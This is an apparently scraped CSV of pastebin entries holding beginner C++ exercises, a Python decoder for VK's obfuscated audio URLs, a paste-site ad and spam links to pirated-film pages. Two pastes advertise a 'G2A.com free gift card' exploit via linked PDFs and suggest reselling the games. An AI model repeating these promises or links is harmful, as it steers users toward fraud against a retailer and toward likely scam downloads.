id,title,username,language,date,content
adPsjxVx,G2A.com Free Gift Card Guide Mar 2024 FIX,HastyBasher0,GetText,Tuesday 12th of March 2024 01:04:08 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.

This is not my pastebin account and im using a random inactive one to post this.
 
PDF guide here:
https://smallpdf.com/file#s=e45853d1-004b-4ae4-968e-c4f2afc13e32
 
Working as of:
12 March 2024















































"
DUjvxVv0,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 12:52:45 PM CDT,"#include <iostream>
using namespace std;
 
int main() {
    int vkupno;
    int vkupno2;
    cin >> vkupno;
    vkupno2 = vkupno;
    
    int h = vkupno / 3600;
    vkupno -= h * 3600;
    
    int m = vkupno / 60;
    int s = vkupno % 60;
    
    cout << vkupno2 << "" sekundi se "" << h << "" casovi, "" << m << "" minuti i "" << s << "" sekundi"" <<endl;
    return 0;
}
// 14500
// 4h --> 4*3600 = 14400

// 100 / 60 = 1
// 40
"
ANZwvrKi,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 12:40:10 PM CDT,"#include <iostream>
using namespace std;
 
int main() {
    int broj;
    cin >> broj;
    
    int treta_cifra = broj % 10;
    int vtora_cifra = (broj / 10) % 10;
    int prva_cifra = broj / 100;
    
    cout << ""Na brojot "" << broj << "" prvata cifra e "" << prva_cifra << "", vtorata cifra e "" << vtora_cifra << "", tretate cifra e "" << treta_cifra << endl;
    return 0;
}
"
1qAjKTwy,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 12:33:29 PM CDT,"#include <iostream>
using namespace std;
 
int main() {
    float a, b;
    cin >> a >> b;
    
    cout << ""Srednata vrednost na "" << a << "" i "" << b << "" e "" << (a + b) / 2 << endl;
    
    return 0;
}
"
a92PEkGN,Untitled,ledza228,Python,Tuesday 12th of March 2024 12:20:28 PM CDT,"VK_STR = ""abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN0PQRSTUVWXYZO123456789+/=""


def splice(l, a, b, c):
    """""" JS's Array.prototype.splice

    var x = [1, 2, 3],
        y = x.splice(0, 2, 1337);

    eq

    x = [1, 2, 3]
    x, y = splice(x, 0, 2, 1337)
    """"""

    return l[:a] + [c] + l[a + b:], l[a:a + b]


def decode_audio_url(string, user_id):
    vals = string.split(""?extra="", 1)[1].split(""#"")

    tstr = vk_o(vals[0])
    ops_list = vk_o(vals[1]).split('\x09')[::-1]

    for op_data in ops_list:

        split_op_data = op_data.split('\x0b')
        cmd = split_op_data[0]
        if len(split_op_data) > 1:
            arg = split_op_data[1]
        else:
            arg = None

        if cmd == 'v':
            tstr = tstr[::-1]

        elif cmd == 'r':
            tstr = vk_r(tstr, arg)

        elif cmd == 'x':
            tstr = vk_xor(tstr, arg)
        elif cmd == 's':
            tstr = vk_s(tstr, arg)
        elif cmd == 'i':
            tstr = vk_i(tstr, arg, user_id)
        else:
            raise Exception(
                'Unknown decode cmd: ""{}""; Please send bugreport'.format(cmd)
            )

    return tstr


def vk_o(string):
    result = []
    index2 = 0

    for s in string:
        sym_index = VK_STR.find(s)

        if sym_index != -1:
            if index2 % 4 != 0:
                i = (i << 6) + sym_index
            else:
                i = sym_index

            if index2 % 4 != 0:
                index2 += 1
                shift = -2 * index2 & 6
                result += [chr(0xFF & (i >> shift))]
            else:
                index2 += 1

    return ''.join(result)


def vk_r(string, i):
    vk_str2 = VK_STR + VK_STR
    vk_str2_len = len(vk_str2)

    result = []

    for s in string:
        index = vk_str2.find(s)

        if index != -1:
            offset = index - int(i)

            if offset < 0:
                offset += vk_str2_len

            result += [vk_str2[offset]]
        else:
            result += [s]

    return ''.join(result)


def vk_xor(string, i):
    xor_val = ord(i[0])

    return ''.join(chr(ord(s) ^ xor_val) for s in string)


def vk_s_child(t, e):
    i = len(t)

    if not i:
        return []

    o = []
    e = int(e)

    for a in range(i - 1, -1, -1):
        e = (i * (a + 1) ^ e + a) % i
        o.append(e)

    return o[::-1]


def vk_s(t, e):
    i = len(t)

    if not i:
        return t

    o = vk_s_child(t, e)
    t = list(t)

    for a in range(1, i):
        t, y = splice(t, o[i - 1 - a], 1, t[a])
        t[a] = y[0]

    return ''.join(t)


def vk_i(t, e, user_id):
    return vk_s(t, int(e) ^ user_id)



print(decode_audio_url(""https:\/\/vk.com\/mp3\/audio_api_unavailable.mp3?extra=AhrlrfHZyw1WqMjUwvz6x184uNzbzvHFoeuWlLbdDKmWDtGXBMr4otnOCN03AwnWCO8YDgjJCK0XlKC1uxeZsJmXtM5ZrLaZCNbrAZz4CMe2DM8VqNKWCuTylY9LBhvJmxnFzunZvgu6zefrwvz0rc1XC3fmCM0VmLHOBNvmytjAthDwuODsqK94AKHxt29ys29IzgzKsha1vNPZltnvmLH5ywjPDfm4tdfiqKfPnhjtuvCUAc9YDwLHss9MC2vOmtjcz2XPr3b1wenLl25RuhbO#AqS2nJy"",
                        213818620))"
DFKBHz2U,Pastes.io - #1 Pastebin Alternative,xxsa,PHP,Tuesday 12th of March 2024 12:20:27 PM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Paste Folders
Load files feature
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Embed, download, print pastes
Clone pastes
Socialite (Facebook/Twitter/Google Social login)
Load files feature
Trending pastes page (day, week, month, year)
150+ different syntax languages
25+ Syntax Highlighting Skins for Ace Syntax Highlighter
Paste Folders
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Facebook/Disqus/Custom comment system
Invisible/Custom captcha protection
Trending pastes page (day, week, month, year)
No Captcha for logged in users feature

Simple Ads by Google Adsense Few rather than Pastebin"
cdKP9RWn,esfsegseh,gadungw71,PHP,Tuesday 12th of March 2024 12:03:38 PM CDT,"•	https://www.charidy.com/1710221946632073709
•	https://www.charidy.com/1710222465600799148
•	https://torre.ai/2024hd1080p?r=gVRU6aYN
•	https://torre.ai/hdquality?r=0LKcrb8W
•	https://www.charidy.com/1710226992718414655
•	https://www.charidy.com/1710227264412016346
•	https://torre.ai/hdquality8?r=FpUyfBVV
•	https://torre.ai/tw2024hd1080p?r=DrNHsHg6
•	https://www.charidy.com/1710228738070324102
•	https://www.charidy.com/1710229193946692241
•	https://www.charidy.com/1710229638278946889
•	https://www.charidy.com/1710230031367370789
•	https://www.charidy.com/1710230640495011860
•	https://torre.ai/2024hd1080p0?r=PzT9asCy
•	https://torre.ai/hdbluray?r=RmUxIOKt
•	https://torre.ai/tw2024hd1080p9?r=y7eBbrBq
•	https://www.charidy.com/1710250572614981847
•	https://www.charidy.com/1710250871114127449
•	https://www.charidy.com/1710251164444254175
•	https://torre.ai/fullhdxemphimmai2024vietsubthuyetminhultrahd?r=pNHNtMRN
•	https://torre.ai/xemphimmai20244kfullvietsubphimmoi?r=4J3xndX3
•	https://torre.ai/maifullhd1080vietsubxemphimmoionline?r=w5qF3WuV
•	https://www.charidy.com/1710253331997375405
•	https://www.charidy.com/1710253544654435554
•	https://www.charidy.com/1710253727009102190
•	https://torre.ai/xemphimkungfupanda42024fullhdvietsubthuyetminhmienphi?r=PVyW6z7a
•	https://torre.ai/phimkungfupanda42024fullhdvisub4kultrahd?r=mVdnYRf1
•	https://torre.ai/fullhdxemphimkungfupanda42024vietsubthuyetminh?r=gMGH2uUJ
•	https://www.charidy.com/1710255919032712865
•	https://www.charidy.com/1710256258873884621
•	https://www.charidy.com/1710257039604162308
•	https://torre.ai/fullhdxemphimexhumaquatmotrungma2024vietsubthuyetminh?r=P6se34Op
•	https://torre.ai/xemphimexhumaquatmotrungma2024fullhdvietsubthuyetminhmienphi?r=7Zp1BVMh
•	https://torre.ai/fullhdxemphimexhumaquatmotrungma2024vietsubhighquality?r=tJNYKlzh
•	https://www.taskade.com/p/xem-phim-exhuma-quat-mo-trung-ma-2024-vietsub-full-hd-phimmoi-01HRSNF8FB92CP3Q565WG4T2B4
•	https://www.taskade.com/p/xem-phim-exhuma-quat-mo-trung-ma-bo-phim-vietsub-full-hd-thuyet-minh-01HRSNRMCGRN5YE3D2VZRAH2WK
•	https://wandering.flarum.cloud/d/48562-kejarlahkeinginanmu
•	https://click4r.com/posts/g/15094744/besarcinta
•	https://forum.webnovel.com/d/169422-taksegampangperguso
•	https://hiuderyy.hashnode.dev/perguso
•	https://gamma.app/docs/Untitled-f7wzimtxf0qcjw1
•	https://open.firstory.me/story/cltolb4pk09et01xkcv8y511r
•	https://telegra.ph/santuycuy-03-12
•	https://paste.ee/p/14RLt
•	https://start.me/w/gkYA0Q
•	https://hackmd.io/@rerewilli6/HklFVWCpa
•	https://muckrack.com/awaraer-etawaku/bio
•	https://profile.hatena.ne.jp/asdawfaw/
"
P4Hz4sFG,G2A.com Free Gift Card Guide Mar 2024,ounnuo,GetText,Tuesday 12th of March 2024 11:54:49 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_267343.pdf

Working as of:
12 March 2024





















"
7L3ADgLQ,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 11:54:17 AM CDT,"#include <iostream>
#include <algorithm>
using namespace std;
 
int main() {
    int a, b, c;
    cin >> a >> b >> c;
    
    int niza[3];
    niza[0] = a;
    niza[1] = b;
    niza[2] = c;
    sort(niza, niza + 3);
    a = niza[0];
    b = niza[1];
    c = niza[2];
    
    int max_a = a, max_b = b, max_c = c;
    if(a >= 5) {
        max_a = 5;
    }
    if(b >= 5) {
        max_b = 5;
    }
    if(c >= 5) {
        max_c = 5;
    }
    int sum = max_a + max_b + max_c;
    
    if(a + sum - max_a >= b - max_b or a + sum - max_a >= c - max_c or b + sum - max_b >= c - max_c) {
        cout << ""DA"" << endl;
    }
    else {
        cout << ""NE"" << endl;
    }
    return 0;
}
"
JuVmfF4j,Untitled,Josif_tepe,C++,Tuesday 12th of March 2024 11:27:45 AM CDT,"#include <iostream>
using namespace std;
 
int main() {
    int n;
    cin >> n;
    
    int res = 2e9;
    for(int i = 0; i <= n; i++) {
        int d = 5 * i;
        if(d >= n) {
            if(res > i) {
                res = i;
            }
            
        }
        
        if(d <= n) {
            
            
            int s = n - d;
            s /= 10;
            
            if((n - d) % 10 != 0) {
                s++;
            }
            if(i >= s) {
                if(res > i + s) {
                    res = i + s;
                }
            }
        }
        
    }
    cout << res << endl;
    return 0;
}
"
